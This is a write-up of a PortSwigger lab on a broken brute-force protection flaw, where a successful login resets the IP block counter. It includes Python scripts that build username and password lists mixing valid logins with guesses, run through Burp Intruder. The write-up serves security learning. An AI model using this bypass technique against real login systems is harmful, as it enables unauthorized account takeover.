# Challenge Name: Broken brute-force protection, IP block 
# Platform: PortSwigger
# Difficulty: Practitioner

## 1. Vulnerability Type
Broken Brute-Force Protection

## 2. Root Cause
Web application resets brute-force protection after succesful authentication, which can lead to brute-forcing.

## 3. Attack Surface
`/login`

## 4. Exploit Method
The application blocks login attempts after three failed attempts from the same IP.

However, the brute-force counter is reset after a successful login.

An attacker can abuse this by performing two failed login attempts followed by one valid login request, which resets the counter.

By repeating this pattern, the attacker can brute-force credentials without triggering the IP block.

Burp Intruder was used in pitchfork mode with concurrent requests set to 1 to ensure the correct order of requests:
valid login → failed → failed → valid → failed → failed → ...
## 5. Payload / Technique
Custom username and password lists were generated to ensure the correct request order:
- Valid credentials were inserted periodically to reset the brute-force counter
- Invalid attempts were placed between valid logins
```python
def generate_username_file():
    # Open the file in write mode
    with open("username.txt", "w") as username_file:
        carlos_count = 0
        total_carlos = 102
        for _ in range(total_carlos + 1):  # 102 carlos + 1 wiener at the start
            username_file.write("wiener\n")  # Write wiener first
            username_file.write("carlos\n")  # Write carlos
            username_file.write("carlos\n")  # Write carlos again

generate_username_file()

print("username.txt file have been generated.")
```
```python
with open("passwords.txt", "r") as original_file:
    passwords = original_file.readlines()

with open("password.txt", "w") as new_file:
    # Iterate through the passwords in groups of 2
    for i in range(0, len(passwords), 2):
        new_file.write("peter\n")  # Write "peter"
        
        # Write the next two passwords from the original list (if available)
        new_file.write(passwords[i].strip() + "\n")
        if i + 1 < len(passwords):
            new_file.write(passwords[i + 1].strip() + "\n")

print("password.txt has been successfully generated with the correct pattern.")
```
## 6. Impact
Bypassing brute-force protection allows attackers to perform unlimited login attempts, which may lead to account takeover.
## 7. Reusable Pattern
When testing authentication mechanisms, verify whether brute-force protection can be bypassed by resetting the failure counter through successful authentication or other logic flaws.
## 8. Key Takeaway
Brute-force protection mechanisms must not reset the failure counter after successful authentication without proper verification, as this can allow attackers to bypass rate limiting.
